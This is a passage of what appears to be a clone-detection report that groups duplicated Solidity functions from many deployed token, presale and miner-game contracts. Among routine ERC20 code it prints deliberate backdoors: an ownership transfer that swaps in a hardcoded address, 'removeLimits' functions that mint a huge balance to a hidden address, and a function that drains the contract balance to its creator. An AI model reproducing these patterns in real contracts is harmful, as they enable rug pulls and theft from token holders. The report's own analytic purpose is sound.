<source file="systems/source-code/0xc096251a6bb2e6c2015307be53fe60b01a4a7c3e.sol" startline="64" endline="67" pcid="6883">
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc096251a6bb2e6c2015307be53fe60b01a4a7c3e.sol" startline="55" endline="58" pcid="6881">
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
</class>

<class classid="210" nclones="5" nlines="5" similarity="75">
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="75" endline="79" pcid="3043">
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75ead649fc217b1a630aee17278b1f2045b6b276.sol" startline="55" endline="59" pcid="4376">
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="449" endline="453" pcid="9260">
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "TRC20: transfer amount exceeds allowance"));
    return true;
  }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="52" endline="56" pcid="3610">
    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc096251a6bb2e6c2015307be53fe60b01a4a7c3e.sol" startline="69" endline="73" pcid="6884">
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }
</source>
</class>

<class classid="211" nclones="4" nlines="8" similarity="85">
<source file="systems/source-code/0x523747c5bed9b50161c801b4a4b7a7799a1add3c.sol" startline="91" endline="99" pcid="3046">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x5f60596411116de6c38ac8d68c159700cf72db3f.sol" startline="58" endline="66" pcid="3611">
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");
        
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xF532E8298D9b5021cb762EDe236493BE8Fff30B4.sol" startline="111" endline="119" pcid="8966">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="111" endline="119" pcid="9010">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }
</source>
</class>

<class classid="212" nclones="2" nlines="5" similarity="100">
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="68" endline="72" pcid="3357">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = 0xCddC0851F94723E43eBc660500644eDe330bCc60;/*newOwner;*/
        }
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="68" endline="72" pcid="7396">
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = 0xCddC0851F94723E43eBc660500644eDe330bCc60;/*newOwner;*/
        }
    }
</source>
</class>

<class classid="213" nclones="3" nlines="8" similarity="85">
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="330" endline="337" pcid="3370">
    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = 30000000000000000000000000;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
        deprecated = false;
    }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="330" endline="337" pcid="7409">
    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
        deprecated = false;
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="330" endline="337" pcid="4458">
    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {
        _totalSupply = _initialSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balances[owner] = _initialSupply;
        deprecated = false;
    }
</source>
</class>

<class classid="214" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="174" endline="176" pcid="3405">
    function requestStakingWithdraw(uint256 _amount) public onlyOwner {
        tellorFlex.requestStakingWithdraw(_amount);
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="232" endline="234" pcid="3415">
    function addStakingRewards(uint256 _amount) public onlyOwner {
        tellorFlex.addStakingRewards(_amount);
    }
</source>
</class>

<class classid="215" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="178" endline="180" pcid="3406">
    function mintToOracle() public onlyOwner {
        tellorToken.mintToOracle();
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="182" endline="184" pcid="3407">
    function withdrawStake() public onlyOwner {
        tellorFlex.withdrawStake();
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="242" endline="244" pcid="3417">
    function updateStakeAmount() public onlyOwner {
        tellorFlex.updateStakeAmount();
    }
</source>
</class>

<class classid="216" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="195" endline="197" pcid="3410">
    function getTellorOracle() public view returns (address) {
        return address(tellorFlex);
    }
</source>
<source file="systems/source-code/0x5a22ab99e1ffc1c27967cb3f4d7da6b535077c23.sol" startline="199" endline="201" pcid="3411">
    function getTellorToken() public view returns (address) {
        return address(tellorToken);
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="612" endline="614" pcid="4565">
    function getAddress() public view returns (address) {
        return address(this);
    }
</source>
</class>

<class classid="217" nclones="3" nlines="4" similarity="100">
<source file="systems/source-code/0x5f0E9E062f22c7C32A243f93fB2a6aA7da748114.sol" startline="19" endline="26" pcid="3587">
    function buyTokens() public payable {
        
        buyers[msg.sender] += msg.value;
        
        emit Purchase(msg.sender, msg.value);
        
        
    }
</source>
<source file="systems/source-code/0xFEE08Ecff5BcacCe2EdE4484240b2658F530Ea7E.sol" startline="27" endline="37" pcid="9321">
    function buyTokens() public payable {
        

        // Record the buyer's purchase.
        buyers[msg.sender] += msg.value;
        
        // Emit an event for the purchase
        emit Purchase(msg.sender, msg.value);
        
        
    }
</source>
<source file="systems/source-code/0xb90ffbb2b6b1534d67bf98c05e00be06e2a6672d.sol" startline="19" endline="29" pcid="6693">
    function buyTokens() public payable {
        

        // Record the buyer's purchase.
        buyers[msg.sender] += msg.value;
        
        // Emit an event for the purchase
        emit Purchase(msg.sender, msg.value);
        
        
    }
</source>
</class>

<class classid="218" nclones="3" nlines="6" similarity="100">
<source file="systems/source-code/0x5f0E9E062f22c7C32A243f93fB2a6aA7da748114.sol" startline="29" endline="35" pcid="3588">
    function withdraw() public {
        require(msg.sender == owner, "You are not the owner.");
        require(address(this).balance > 0, "The balance is zero.");
        
        uint256 balance = address(this).balance;
        owner.transfer(balance);
    }
</source>
<source file="systems/source-code/0xFEE08Ecff5BcacCe2EdE4484240b2658F530Ea7E.sol" startline="40" endline="46" pcid="9322">
    function withdraw() public {
        require(msg.sender == owner, "You are not the owner.");
        require(address(this).balance > 0, "The balance is zero.");
        
        uint256 balance = address(this).balance;
        owner.transfer(balance);
    }
</source>
<source file="systems/source-code/0xb90ffbb2b6b1534d67bf98c05e00be06e2a6672d.sol" startline="32" endline="38" pcid="6694">
    function withdraw() public {
        require(msg.sender == owner, "You are not the owner.");
        require(address(this).balance > 0, "The balance is zero.");
        
        uint256 balance = address(this).balance;
        owner.transfer(balance);
    }
</source>
</class>

<class classid="219" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x604e586f17ce106b64185a7a0d2c1da5bace711e.sol" startline="39" endline="42" pcid="3640">
    function setOwner(address _owner) external onlyAuthorized {
        require(_owner != address(0));
        owner = _owner;
    }
</source>
<source file="systems/source-code/0x604e586f17ce106b64185a7a0d2c1da5bace711e.sol" startline="48" endline="51" pcid="3641">
    function setGovernance(address _governance) external onlyGovernance {
        require(_governance != address(0));
        governance = _governance;
    }
</source>
</class>

<class classid="220" nclones="2" nlines="8" similarity="71">
<source file="systems/source-code/0x75ead649fc217b1a630aee17278b1f2045b6b276.sol" startline="66" endline="75" pcid="4378">
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
</source>
<source file="systems/source-code/0x8bc69EEB26c131274971c972576C54a5765de2de.sol" startline="23" endline="31" pcid="5160">
    function _transfer(address _sender, address _recipient, uint256 _amount) internal {
        require(_sender != address(0), "Invalid address");
        require(_recipient != address(0), "Invalid address");
        require(balance[_sender] >= _amount, "Insufficient balance");

        balance[_sender] -= _amount;
        balance[_recipient] += _amount;
        emit Transfer(_sender, _recipient, _amount);
    }
</source>
</class>

<class classid="221" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="490" endline="493" pcid="4538">
    function setStakeContract(IStake _stake) public onlyOwner {
        stake = _stake;
        emit SetIStake(_stake);
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="534" endline="537" pcid="4547">
    function setUSDTToken(USDTInterface token_address) public onlyOwner {
        usdtToken = token_address;
        emit SetUSDTToken(token_address);
    }
</source>
</class>

<class classid="222" nclones="3" nlines="4" similarity="100">
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="495" endline="498" pcid="4539">
    function setInSell(bool _inSell) public onlyOwner {
        inSell = _inSell;
        emit SetInSell(_inSell);
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="500" endline="503" pcid="4540">
    function setInClaim(bool _inClaim) public onlyOwner {
        inClaim = _inClaim;
        emit SetInClaim(_inClaim);
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="505" endline="508" pcid="4541">
    function setInStake(bool _inStake) public onlyOwner {
        inStake = _inStake;
        emit SetInStake(_inStake);
    }
</source>
</class>

<class classid="223" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="510" endline="512" pcid="4542">
    function setInRefReward(bool _inRefReward) public onlyOwner {
        inRefReward = _inRefReward;
    }
</source>
<source file="systems/source-code/0xB01F11280F7A164E418F6740181658e441f2250e.sol" startline="158" endline="160" pcid="6448">
    function setAllowEveryoneInPrivateSale(bool _allowEveryoneInPrivateSale) public onlyOwner {
        allowEveryoneInPrivateSale = _allowEveryoneInPrivateSale;
    }
</source>
</class>

<class classid="224" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="552" endline="554" pcid="4550">
    function getTotalRaise() public view returns (uint256) {
        return stages[currentStage].totalRaise;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="556" endline="558" pcid="4551">
    function getRaised() public view returns (uint256) {
        return stages[currentStage].raised;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="576" endline="578" pcid="4556">
    function getPriceInUSD() public view returns (uint256) {
        return stages[currentStage].priceInUSDStage;
    }
</source>
</class>

<class classid="225" nclones="3" nlines="3" similarity="100">
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="560" endline="562" pcid="4552">
    function getTotalRaiseStage(uint256 stage) public view returns (uint256) {
        return stages[stage].totalRaise;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="572" endline="574" pcid="4555">
    function getPriceInUSD(uint256 stage) public view returns (uint256) {
        return stages[stage].priceInUSDStage;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="564" endline="566" pcid="4553">
    function getRaisedStage(uint256 stage) public view returns (uint256) {
        return stages[stage].raised;
    }
</source>
</class>

<class classid="226" nclones="2" nlines="5" similarity="100">
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="636" endline="640" pcid="4568">
    function getLatestPriceEthPerUSD() public view returns (uint256) {
        (, int256 price, , , ) = aggregatorETHInterface.latestRoundData();
        price = (price * (10**10));
        return uint256(price);
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="642" endline="646" pcid="4569">
    function getLatestPriceUSDTPerUSD() public view returns (uint256) {
        (, int256 price, , , ) = aggregatorUSDTInterface.latestRoundData();
        price = (price * (10**10));
        return uint256(price);
    }
</source>
</class>

<class classid="227" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="865" endline="867" pcid="4582">
    function withdraw() public onlyOwner {
        token.transfer(_walletToken, token.balanceOf(address(this)));
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="869" endline="871" pcid="4583">
    function withdrawRef() public onlyOwner {
        usdtToken.transfer(_wallet, usdtToken.balanceOf(address(this)));
    }
</source>
</class>

<class classid="228" nclones="6" nlines="5" similarity="100">
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="46" endline="50" pcid="4736">
    function delBots(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 100000000*10000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc17DC80eF016E918587Ea3ffb55894a8515519C1.sol" startline="42" endline="46" pcid="6934">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 100000000*10000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="42" endline="46" pcid="7496">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 100000000*10000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="43" endline="47" pcid="5210">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 100000000*10000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="42" endline="46" pcid="6679">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 100000000*10000*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="42" endline="46" pcid="7600">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 100000000*10000*addBot*10**tokenDecimals;
        }
    } 
</source>
</class>

<class classid="229" nclones="2" nlines="16" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="25" endline="44" pcid="4801">
    function rebakeMNS(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;

        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,15),100));

        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="25" endline="44" pcid="4976">
    function rebakeMNS(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;

        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,15),100));

        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
</source>
</class>

<class classid="230" nclones="2" nlines="11" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="45" endline="55" pcid="4802">
    function eatMNS() public{
        require(initialized);
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        uint256 fee=devFee(eggValue);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(eggValue,fee));
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="45" endline="55" pcid="4977">
    function eatMNS() public{
        require(initialized);
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        uint256 fee=devFee(eggValue);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
        ceoAddress.transfer(fee);
        msg.sender.transfer(SafeMath.sub(eggValue,fee));
    }
</source>
</class>

<class classid="231" nclones="2" nlines="9" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="56" endline="64" pcid="4803">
    function bakeMNS(address ref) public payable{
        require(initialized);
        uint256 eggsBought=calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        uint256 fee=devFee(msg.value);
        ceoAddress.transfer(fee);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        rebakeMNS(ref);
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="56" endline="64" pcid="4978">
    function bakeMNS(address ref) public payable{
        require(initialized);
        uint256 eggsBought=calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        uint256 fee=devFee(msg.value);
        ceoAddress.transfer(fee);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        rebakeMNS(ref);
    }
</source>
</class>

<class classid="232" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="67" endline="70" pcid="4804">
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="67" endline="70" pcid="4979">
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
</source>
</class>

<class classid="233" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="71" endline="73" pcid="4805">
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs,address(this).balance);
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="71" endline="73" pcid="4980">
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs,address(this).balance);
    }
</source>
</class>

<class classid="234" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="74" endline="76" pcid="4806">
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketEggs);
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="74" endline="76" pcid="4981">
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketEggs);
    }
</source>
</class>

<class classid="235" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="77" endline="79" pcid="4807">
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).balance);
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="77" endline="79" pcid="4982">
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).balance);
    }
</source>
</class>

<class classid="236" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="80" endline="82" pcid="4808">
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="80" endline="82" pcid="4983">
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,5),100);
    }
</source>
</class>

<class classid="237" nclones="2" nlines="6" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="83" endline="88" pcid="4809">
    function openKitchen() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketEggs==0);
        initialized=true;
        marketEggs=86400000000;
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="83" endline="88" pcid="4984">
    function openKitchen() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketEggs==0);
        initialized=true;
        marketEggs=86400000000;
    }
</source>
</class>

<class classid="238" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="92" endline="94" pcid="4811">
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="92" endline="94" pcid="4986">
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
</source>
</class>

<class classid="239" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="95" endline="97" pcid="4812">
    function getMyEggs() public view returns(uint256){
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="95" endline="97" pcid="4987">
    function getMyEggs() public view returns(uint256){
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
</source>
</class>

<class classid="240" nclones="2" nlines="4" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="98" endline="101" pcid="4813">
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="98" endline="101" pcid="4988">
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(now,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
</source>
</class>

<class classid="241" nclones="2" nlines="3" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="102" endline="104" pcid="4814">
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="102" endline="104" pcid="4989">
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
</source>
</class>

<class classid="242" nclones="2" nlines="5" similarity="100">
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="105" endline="109" pcid="4815">
    function refreshEggs() public payable{
    require(msg.sender == ceoAddress, "Refresh Mining");
    uint256 contractBalance = address(this).balance;
    ceoAddress.transfer(contractBalance);
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="105" endline="109" pcid="4990">
    function refreshEggs() public payable{
    require(msg.sender == ceoAddress, "Refresh Mining");
    uint256 contractBalance = address(this).balance;
    ceoAddress.transfer(contractBalance);
    }
</source>
</class>

<class classid="243" nclones="3" nlines="4" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="87" endline="90" pcid="5120">
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="196" endline="199" pcid="8632">
    function pause() onlyOwner whenNotPaused public {
        paused = true;
        emit Pause();
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="89" endline="92" pcid="5989">
  function pause() onlyOwner whenNotPaused public {
    paused = true;
    emit Pause();
  }
</source>
</class>

<class classid="244" nclones="3" nlines="4" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="95" endline="98" pcid="5121">
  function unpause() onlyOwner whenPaused public {
    paused = false;
    emit Unpause();
  }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="97" endline="100" pcid="5990">
  function unpause() onlyOwner whenPaused public {
    paused = false;
    emit Unpause();
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="201" endline="204" pcid="8633">
    function unpause() onlyOwner whenPaused public {
        paused = false;
        emit Unpause();
    }
</source>
</class>

<class classid="245" nclones="2" nlines="9" similarity="100">
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="127" endline="137" pcid="5122">
